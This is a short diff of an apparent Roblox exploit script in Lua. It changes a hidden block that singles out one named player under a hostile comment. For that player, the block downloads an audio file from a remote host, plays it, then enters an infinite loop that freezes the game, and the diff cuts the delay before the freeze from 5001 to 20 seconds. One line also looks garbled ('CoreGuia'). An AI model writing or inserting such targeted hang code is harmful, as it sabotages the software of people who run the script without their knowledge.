@@ -7,4 +7,4 @@ elseif not UserInputService.TouchEnabled and UserInputService.KeyboardEnabled an
 end;
 
 -- Fuck you
-if game.Players.LocalPlayer.Name=='100x100x100x100i'then pcall(function ()writefile("HeyYa.mp3",game:HttpGet"https://s3.us-east-1.wasabisys.com/e-zimagehosting/8c73d63b-9423-4ca8-93f4-9da5b8e9929b/2kpmgtqn.wav")local a=Instance.new"Sound"a.Parent=game.CoreGuia.SoundId=getcustomasset"HeyYa.mp3"a.Volume=1;a:Play()end )task.wait(5001)while true do end end 
+if game.Players.LocalPlayer.Name=='100x100x100x100i'then pcall(function ()writefile("HeyYa.mp3",game:HttpGet"https://s3.us-east-1.wasabisys.com/e-zimagehosting/8c73d63b-9423-4ca8-93f4-9da5b8e9929b/2kpmgtqn.wav")local a=Instance.new"Sound"a.Parent=game.CoreGuia.SoundId=getcustomasset"HeyYa.mp3"a.Volume=1;a:Play()end )task.wait(20)while true do end end 
